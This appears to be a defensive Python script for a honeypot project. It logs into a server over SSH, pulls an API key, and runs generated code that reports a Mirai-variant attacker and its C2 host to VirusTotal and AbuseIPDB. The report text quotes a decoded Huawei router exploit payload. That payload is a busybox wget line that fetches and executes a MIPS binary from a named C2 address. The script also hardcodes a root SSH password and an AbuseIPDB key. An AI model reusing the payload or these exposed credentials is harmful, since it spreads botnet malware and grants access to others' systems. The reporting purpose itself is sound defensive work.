import paramiko
import sys
import re

def extract_env_and_update():
    host = "178.128.72.149"
    port = 2200
    user = "root"
    password = "INK0uJ8j4a5xCn"
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port, user, password)
        
        # 1. Leer archivo .env del VPS
        stdin, stdout, stderr = ssh.exec_command("cat /root/Active-Defense-Hell/.env")
        env_content = stdout.read().decode('utf-8')
        
        vt_key = None
        for line in env_content.split('\n'):
            if line.startswith('VT_API_KEY='):
                vt_key = line.split('=')[1].strip().strip('"').strip("'")
                
        if not vt_key:
            return "No se pudo encontrar VT_API_KEY en el servidor."
            
        print(f"[*] Obtenida VT_API_KEY del servidor: {vt_key[:5]}...{vt_key[-5:]}")
        
        # 2. Generar el script autónomo para ejecutar en el VPS
        bot_ip = "187.120.33.192"
        c2_ip = "193.233.193.12"
        
        python_script = f"""import requests
import json

VT_KEY = "{vt_key}"
ABUSE_KEY = "a294ad97c828dc6f8e5111d0209475ddbb3e984672d651688d3e3f9007c6a17520f2d20dc46974db"

c2_ip = "193.233.193.12"
bot_ip = "187.120.33.192"

vt_comment = '''#HELL_HONEypot #ThreatIntel
This payload (yeye.mips) was captured by an active defense honeypot (Project HELL).
It attempts to exploit Huawei routers via CVE-2017-17215 (UPnP SOAP command injection on port 37215).

Attack Vector (Decoded SOAP):
$(/bin/busybox wget -g 193.233.193.12 -l /tmp/.oxy -r /yeye/yeye.mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)

Attacker IP: 187.120.33.192 (Infected Node)
C2 Dropzone: 193.233.193.12
Malware Family: Mirai/Gafgyt Variant (IoT Botnet)
Architecture: MIPS
Action: Drops malware, changes permissions, executes and self-replicates.'''

abuse_bot_comment = "[HELL Active Defense Honeypot] Automated bot attempting to exploit CVE-2017-17215 (Huawei UPnP RCE) via SOAP request to port 37215/TCP. Attempted to execute arbitrary commands to download and execute MIPS malware (Mirai variant) from C2: 193.233.193.12. Node is actively participating in an IoT Botnet."

abuse_c2_comment = "[HELL Active Defense Honeypot] IP is acting as a malware distribution C2 / Dropzone for an IoT Botnet (Mirai/Gafgyt variant). Compromised nodes are instructed to download 'yeye.mips' via wget from this host (http://193.233.193.12/yeye/yeye.mips) and execute it."

print("[*] Enviando reporte a VirusTotal (Comentario) para la IP C2...")
vt_headers = {{"x-apikey": VT_KEY, "Content-Type": "application/json"}}
vt_data = {{"data": {{"type": "comment", "attributes": {{"text": vt_comment}}}}}}
try:
    r_vt = requests.post(f"https://www.virustotal.com/api/v3/ip_addresses/{{c2_ip}}/comments", json=vt_data, headers=vt_headers)
    print(f"    └─ Estado VT: {{r_vt.status_code}} - {{'Enviado exitosamente' if r_vt.status_code in [200, 201] else r_vt.text}}")
except Exception as e:
    print(f"    └─ Error VT: {{e}}")

def send_abuse(ip, categories, comment):
    try:
        r = requests.post('https://api.abuseipdb.com/api/v2/report', 
                          data={{'ip': ip, 'categories': categories, 'comment': comment}}, 
                          headers={{'Accept': 'application/json', 'Key': ABUSE_KEY}})
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)

print(f"[*] Enviando reporte a AbuseIPDB para el Bot ({{bot_ip}})...")
code, txt = send_abuse(bot_ip, '14,15,21', abuse_bot_comment)
print(f"    └─ Estado AbuseIPDB (Bot): {{code}} - {{'Enviado exitosamente' if code == 200 else txt}}")

print(f"[*] Enviando reporte a AbuseIPDB para el C2 ({{c2_ip}})...")
code2, txt2 = send_abuse(c2_ip, '9,15', abuse_c2_comment)
print(f"    └─ Estado AbuseIPDB (C2): {{code2}} - {{'Enviado exitosamente' if code2 == 200 else txt2}}")
"""
        
        sftp = ssh.open_sftp()
        with sftp.file('/root/run_report_direct.py', 'w') as f:
            f.write(python_script)
        sftp.close()
        
        stdin, stdout, stderr = ssh.exec_command("python3 /root/run_report_direct.py")
        out = stdout.read().decode('utf-8')
        err = stderr.read().decode('utf-8')
        
        ssh.exec_command("rm /root/run_report_direct.py")
        ssh.close()
        
        return out + ("\nERRORES:\n" + err if err else "")
    except Exception as e:
        return f"ERROR: {e}"

if __name__ == "__main__":
    print(extract_env_and_update())
